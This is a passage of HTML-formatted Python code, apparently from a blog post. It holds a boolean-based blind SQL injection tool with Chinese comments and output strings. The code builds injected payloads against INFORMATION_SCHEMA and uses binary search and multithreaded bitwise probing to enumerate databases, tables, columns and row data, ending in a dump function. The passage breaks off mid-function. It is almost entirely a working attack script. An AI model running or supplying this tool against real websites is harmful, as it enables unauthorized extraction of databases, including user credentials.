class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">feature = <span class=\"string\">'Your Login name'</span></span><br><span class=\"line\">head = <span class=\"string\">'\")'</span></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).text</span><br><span class=\"line\">            <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_db_len</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT LENGTH(database())),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前数据库长度: %d'</span> % lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取当前数据库名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_cu_db_name</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    lenth = get_db_len(url)</span><br><span class=\"line\">    dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" and ascii(substr((select database()),%d,1))\"</span> % (i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        dbname += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[*]'</span>, dbname)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).text</span><br><span class=\"line\">        <span class=\"keyword\">if</span> feature <span class=\"keyword\">in</span> html:</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        newpayload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        newpayload = payload + <span class=\"string\">\"%26\"</span> + <span class=\"string\">\"%d=%d--+\"</span> % (two[i], two[i])</span><br><span class=\"line\">        keys.append(newpayload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread, args=(</span><br><span class=\"line\">            getpayload(url, keys[i]), i, s,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> m:</span><br><span class=\"line\">        s = s | i</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chr(s)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbname</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    num = getdbnum(url)</span><br><span class=\"line\">    lenth = get_all_db_len(url, num)</span><br><span class=\"line\">    dbs = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        dbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">                i, j)</span><br><span class=\"line\">            dbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, dbname)</span><br><span class=\"line\">        print(dbname)</span><br><span class=\"line\">        dbs.append(dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'available databases [%s]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> db <span class=\"keyword\">in</span> dbs:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, db)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_num</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\"</span> % dbname</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    <span class=\"comment\"># print(payload)</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据表数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_table_len</span><span class=\"params\">(url, num, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + \\</span><br><span class=\"line\">            <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span 